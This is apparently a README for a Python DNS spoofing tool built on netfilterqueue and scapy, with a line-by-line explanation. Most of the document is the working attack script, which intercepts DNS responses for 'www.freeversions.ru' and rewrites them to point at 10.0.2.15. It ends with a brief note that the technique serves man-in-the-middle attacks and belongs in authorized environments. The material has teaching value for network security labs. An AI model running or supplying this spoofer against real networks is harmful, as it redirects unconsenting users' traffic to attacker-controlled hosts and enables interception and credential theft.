# DNSspoofer
python

import netfilterqueue
import scapy.all as scapy

    netfilterqueue: This module interfaces with the NetfilterQueue in Linux, allowing the interception and modification of network packets.
    scapy.all: This imports all necessary functions from the Scapy library for network packet manipulation.

Function: process_packet(packet)

python

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.freeversions.ru" in qname.decode():
            print("[+] spoffing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")

            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

    process_packet(packet): This function processes each packet intercepted by NetfilterQueue.
    scapy.IP(packet.get_payload()): Converts the packet payload to a Scapy IP packet.
    scapy_packet.haslayer(scapy.DNSRR): Checks if the packet has a DNS Resource Record layer, indicating a DNS response.
    qname = scapy_packet[scapy.DNSQR].qname: Extracts the queried domain name from the DNS Question Record layer.
    if "www.freeversions.ru" in qname.decode(): Checks if the queried domain name matches "www.freeversions.ru".
    If it matches, a spoofed DNS response is created:
        scapy.DNSRR(rrname=qname, rdata="10.0.2.15"): Creates a DNS Resource Record with the queried name and the fake IP address "10.0.2.15".
        scapy_packet[scapy.DNS].an = answer: Sets the DNS answer section to the spoofed answer.
        scapy_packet[scapy.DNS].ancount = 1: Sets the answer count to 1.
    The packet's IP and UDP headers' length and checksum fields are deleted to force Scapy to recalculate them:
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len
    packet.set_payload(bytes(scapy_packet)): Sets the modified packet payload.
    packet.accept(): Accepts the packet, sending it to its destination.

Setting Up the Queue

python

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

    queue = netfilterqueue.NetfilterQueue(): Creates a new NetfilterQueue instance.
    queue.bind(0, process_packet): Binds the queue to queue number 0 and sets the process_packet function as the callback for packet processing.
    queue.run(): Starts the queue, continuously processing packets as they arrive.

Summary

This script is a DNS spoofing tool that intercepts DNS requests using a NetfilterQueue in Linux. It looks for DNS queries for "www.freeversions.ru" and responds with a fake IP address ("10.0.2.15"), effectively redirecting the target to a different server. Here's a brief flow of the script:

    Intercept Packets: Using NetfilterQueue, intercept network packets.
    Process Packets: Check if the packet is a DNS response.
    Check Domain: If the DNS query is for "www.freeversions.ru", spoof the DNS response with a fake IP.
    Modify Packet: Adjust the packet fields and set the payload.
    Send Packet: Accept and forward the modified packet.

This technique is commonly used for malicious purposes like redirecting traffic or creating a man-in-the-middle attack, so it should only be used in controlled and authorized environments.
